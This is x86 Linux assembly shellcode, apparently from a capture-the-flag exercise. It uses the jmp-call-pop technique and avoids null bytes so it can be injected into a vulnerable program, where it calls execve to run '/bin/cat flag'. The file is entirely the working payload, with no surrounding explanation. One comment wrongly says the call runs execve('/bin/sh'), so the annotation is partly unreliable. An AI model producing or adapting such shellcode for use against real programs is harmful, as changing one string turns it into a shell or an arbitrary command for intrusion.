#include <sys/syscall.h>

#define STRING  "/bin/catNflag"
#define STRLEN1  8
#define STRLEN2  13
#define ARGV    (STRLEN2+1)
#define ENVP    (ARGV+8)

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popl    %esi                    /* esi points to STRING1 "/bin/cat" */
  movl    %esi,(ARGV)(%esi)       /* set up argv1 pointer to pathname */
  leal    (STRLEN1+1)(%esi),%eax  /* eax points to STRING2 "flag" */
  movl    %eax,(ARGV+4)(%esi)     /* set up argv2 pointer to flag */
  xorl    %eax,%eax               /* get a 32-bit zero value */
  movb    %al,(STRLEN1)(%esi)      /* null-terminate N */
  movb    %al,(STRLEN2)(%esi)      /* null-terminate flag */
  movl    %eax,(ENVP)(%esi)       /* set up null envp */
  
  movb    $SYS_execve,%al         /* syscall number */
  movl    %esi,%ebx               /* arg 1: string pathname */
  leal    ARGV(%esi),%ecx         /* arg 2: argv */
  leal    ENVP(%esi),%edx         /* arg 3: envp */
  int     $0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
  
  xorl    %ebx,%ebx               /* arg 1: 0 */
  movl    %ebx,%eax
  inc     %eax                    /* exit(0) */
  /* mov+inc to avoid null byte */
  int     $0x80                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING